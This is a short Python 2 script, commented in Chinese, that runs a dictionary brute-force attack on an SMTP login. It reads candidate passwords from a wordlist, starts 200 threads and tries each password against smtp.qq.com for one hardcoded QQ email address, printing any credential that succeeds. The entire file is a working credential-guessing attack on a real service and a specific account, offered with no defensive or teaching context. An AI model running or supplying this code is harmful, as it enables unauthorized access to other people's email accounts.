#!/usr/bin/env python
# -*- coding: gbk -*-
#导入smtplib和MIMEText
import smtplib
import pprint
from email.mime.text import MIMEText
import threading
import Queue
import time
class Fuckmail(threading.Thread):

    def __init__(self, mailHost, mailUser, mailPwd):
        threading.Thread.__init__(self)
        self.mailHost = mailHost;
        self.mailUser = mailUser;
        self.mailPwd = mailPwd;

    def run(self):
        while True:
            if self.mailPwd.qsize() > 0:
                self.q = self.mailPwd.get()
                try:
                    self.send = smtplib.SMTP()
                    self.send.connect(self.mailHost)
                    self.result = self.send.login(self.mailUser, self.q)
                    if self.result:
                        pprint.pprint('[*]--User:'+ self.mailUser + '--Pwd:'+ self.q + '---[*]---Success')
                except smtplib.SMTPException as e:
                    print e
            else:
                break
if __name__ == '__main__':
    threads = []
    q = Queue.Queue(0)
    with open('userdict.txt') as dictFile:
        for i in dictFile:
            q.put(i.strip())
        for j in range(200):
            threads.append(Fuckmail('smtp.qq.com', '959297822@qq.com', q))
        for x in threads:
            x.start()
        for y in threads:
            y.join()

